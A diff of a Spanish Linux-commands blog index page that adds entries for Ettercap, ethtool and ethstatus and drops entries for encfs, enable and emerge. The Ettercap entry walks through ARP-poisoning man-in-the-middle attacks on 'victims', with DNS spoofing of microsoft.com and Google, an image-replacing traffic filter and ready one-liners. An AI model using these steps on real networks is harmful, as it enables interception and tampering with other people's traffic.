@@ -9,8 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="muestra el uso y las estadísticas de nuestra red. # ethstats
-">
+  <meta name="description" content="[Dependencias: libcap2 libnet1 zlib1g libpthread-stubs0 libpcre3-dev libpcap-dev libcap-dev libnet6-1.3-0 libnet1-dev libssl-dev ncurses-bin &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -76,6 +75,254 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ettercap/">Ettercap</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>[Dependencias: libcap2 libnet1 zlib1g libpthread-stubs0 libpcre3-dev libpcap-dev libcap-dev libnet6-1.3-0 libnet1-dev libssl-dev ncurses-bin libncurses5-dev libsdl-pango1 libatk1.0-dev]</p>
+
+<p>Snifador de red. Muestra pantallas solicitando aceptación de certificado en los navegadores de las victimas.</p>
+
+<p>descargar de http://ettercap.sourceforge.net/ y descomprimir</p>
+
+<blockquote><p>$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download</p>
+
+<p>$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download</p>
+
+<p>$ tar -zvxf paquete</p>
+
+<p>$ cd ettercap-NG-0.7.3</p></blockquote>
+
+<pre><code>$ ./configure 
+
+$ make 
+
+# make install 
+</code></pre>
+
+<blockquote><p>$ ettercap -P list   (visualizar plugins instalados)</p></blockquote>
+
+<p>modificar archivo de configuración:</p>
+
+<blockquote><p># nano /etc/etter.conf</p></blockquote>
+
+<p>descomentar la linea:himne20-01-13 19:37Menos información</p>
+
+<blockquote><p># if you use iptables:</p></blockquote>
+
+<p>redir_command_on = &#8220;iptables -t nat -A PREROUTING -i %iface -p tcp &#8211;dport %port -j REDIRECT &#8211;to-port %rport&#8221;</p>
+
+<p>Y modificar:</p>
+
+<blockquote><p># the command used by the remote_browser plugin</p></blockquote>
+
+<p>remote_browser = &#8220;firefox -remote openurl(http://%host%url)&#8221;</p>
+
+<p>Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)</p>
+
+<blockquote><p># nano /usr/share/ettercap/etter.dns</p>
+
+<p># 3  Modos de especificar la redirección a localhost</p></blockquote>
+
+<pre><code>microsoft.com          A       192.168.1.2 
+
+*.microsoft.com        A       192.168.1.2 
+
+*google*               A       192.168.1.2
+</code></pre>
+
+<p>Para la sustitución de imagenes:</p>
+
+<blockquote><p># touch test2filter</p></blockquote>
+
+<p>Pegar:</p>
+
+<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
+
+replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
+
+replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
+
+msg("Filter ok.\n");
+</code></pre>
+
+<p>Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:</p>
+
+<blockquote><p># cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Si la respuesta no es 1, lanzar:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:</p>
+
+<blockquote><p># ettercap -C</p></blockquote>
+
+<p>Clicar en:</p>
+
+<pre><code>Sniff -&gt; Unifield sniffing 
+</code></pre>
+
+<p>Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:</p>
+
+<pre><code>Host -&gt; Scan for host 
+</code></pre>
+
+<p>Para escanear la red. Para visionar las máquina activas obtenidas, clic en:</p>
+
+<pre><code>Hosts -&gt; Hosts List 
+</code></pre>
+
+<p>Bajar con el cursor hasta la IP del router y pulsar la tecla &#8220;1&#8221;. Luego nos situamos sobre la IP del objetivo y pulsar la tecla &#8220;2&#8221; con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:</p>
+
+<pre><code>Mitm -&gt; Arp poisoning 
+</code></pre>
+
+<p>Parameters, ponemos:</p>
+
+<pre><code>remote
+</code></pre>
+
+<p>Y arrancamos el sniffer:</p>
+
+<pre><code>Start -&gt; Start sniffing 
+
+Para observar las conexiones que realiza la máquina objetivo: 
+
+View -&gt; Connections 
+
+Para terminar el ataque: 
+
+Mitm -&gt; Stop mitm atack 
+
+Start -&gt; Stop Sniffing 
+
+Start -&gt; Exit
+</code></pre>
+
+<p>Forma abreviada:</p>
+
+<pre><code># ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router 
+
+O solo especificando la del router si se ataca toda la red: 
+</code></pre>
+
+<blockquote><p># ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ethtool/">Ethtool</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Averiguar/modificar la tarjeta de red</p>
+
+<blockquote><p># ethtool eth0  (Para ver la configuración actual de la tarjeta)</p>
+
+<p># ethtool -i eth0  (conocer el driver de la tarjeta de red)</p>
+
+<p># ethtool &#8211;test eth0 (Realizar un test de la tarjeta si está soportado)</p>
+
+<p># ethtool -S eth0 (Consultar estadísticas de la red)</p>
+
+<p># ethtool -p eth0 10 (Hacer parpadear los lets de la interfaz de red)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ethstatus/">Ethstatus</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Monitor de estadísticas de internet</p>
+
+<blockquote><p># ethstatus</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -377,182 +624,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/encfs/">Encfs</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Encriptar directorios.</p>
-
-<blockquote><p># mkdir .cripta cripta  (Crear los directorios)</p>
-
-<p># encfs /home/usuario/.cripta /home/usuario/cripta (Montarlos especificando la ruta absoluta al directorio /home/usuario.)</p></blockquote>
-
-<p>La primera vez que lo usemos solicitará si lo configuramos en modo experto [x] , o preconfigurado [p] tecleamos &#8220;p&#8221; y solicitará la contraseña</p>
-
-<blockquote><p># fusermount -u /home/usuario/cripta/ (desmontar el volumen)</p>
-
-<p># encfsctl passwd /home/usuario/.cripta (cambiar la contraseña)</p>
-
-<p># encfsctl (Mostrar más opciones)</p></blockquote>
-
-<p>La siguiente vez que lo montemos solo nos pedirá la contraseña</p>
-
-<blockquote><p># encfs /home/usuario/.cripta /home/usuario/cripta</p></blockquote>
-
-<p>Aunque siempre se trabaje en el directorio /home/usuario/cripta, los datos estarán realmente en /home/usuario/.cripta donde siempre permanecen encriptados en tiempo real. Si intentamos visualizarlos:</p>
-
-<blockquote><p># ls /home/usuario/.cripta</p></blockquote>
-
-<p>Nos da solamente un numeraco: et5bDtRAOe1F5P0crhyOlYYH</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/enable/">Enable</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Permutar la ejecución de un comando de bash como ejecutable interno [por ejemplo: cd] y ejecutable externo [por ejemplo: /bin/cd]. Algunas shells precisan que determinados comandos se ejecuten de forma externa, o sea indicando su ruta al ejecutable. Por defecto un comando siempre se ejecuta de forma interna.</p>
-
-<blockquote><p>$ enable -a (Ver todos los comandos internos y si están habilitados)</p>
-
-<p>$ enable -n cd (desactiva la ejecución del comando de forma interna)</p>
-
-<p>$ enable cd (lo vuelve a activar)</p>
-
-<p>$ enable -p (lista todos los comandos que se ejecutan internamente)</p>
-
-<p>$ enable -n (muestra los desactivados).</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/emerge/">Emerge</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Instalador de paquetes de gentoo aunque en realidad, emerge no es en si un instalador de paquetes, si no que se descargan las fuentes y se compilan para nuestro sistema.</p>
-
-<blockquote><p># emerge -s paquete (Busca el paquete en el portage)</p>
-
-<p># emerge paquete (Instala el paquete.</p>
-
-<p># emerge -p paquete (Muestra las dependencias para instalar el paquete)</p>
-
-<p># emerge -f paquete (Descarga el paquete pero no lo compila)</p>
-
-<p># emerge -u paquete (Actualiza el paquete)</p>
-
-<p># emerge -C paquete (Desinstala el paquete)</p>
-
-<p># emerge sync (Actualiza el repositorio de paquetes del portage)</p>
-
-<p># emerge world (Reinstala todo el sistema. No recomendado)</p>
-
-<p># emerge -u world (Actualiza la distribución)</p>
-
-<p># emerge -b paquete (Compila el programa, lo instala y nos genera el binario)</p>
-
-<p># emerge -k paquete (Instala un paquete binario anteriormente compilado)</p>
-
-<p># emerge -k paquete (Reinstala un paquete del que ya tenemos el binario)</p>
-
-<p># emerge &#8211;update &#8211;deep &#8211;newuse world (Limpia de paquetes obsoletos)</p>
-
-<p># emerge –depclean (Continuar con depclean)</p>
-
-<p># revdep-rebuild (Y terminar. Precisa paquete gentoolkit)</p>
-
-<p># emerge &#8211;update &#8211;deep &#8211;with-bdeps=y &#8211;newuse world (Actualización completa del sistema cuando se ha modificado el /etc/make.conf)</p>
-
-<p># emerge &#8211;update &#8211;deep world (Actualizar con las dependencias)</p>
-
-<p># emerge &#8211;resume (Proseguir la compilación despues de pararla con Ctrl + c)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/104/">&larr; Older</a>
@@ -568,12 +639,24 @@
     <section>
 <h1>Número de entradas</h1>
 	<ul>
-	<li>1334</li>
+	<li>1337</li>
 	</ul>
 </section>
 <section>
   <h1>Añadidos/modificados</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/rzip/">rzip</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/bzless/">bzless</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/bzexe/">bzexe</a>
+      </li>
     
       <li class="post">
         <a href="/blog/lzma/">lzma</a>
@@ -601,18 +684,6 @@
     
       <li class="post">
         <a href="/blog/compress/">compress</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/chronic/">chronic</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/pvesh/">pvesh</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/honeyproxy/">honeyproxy</a>
       </li>
     
   </ul>
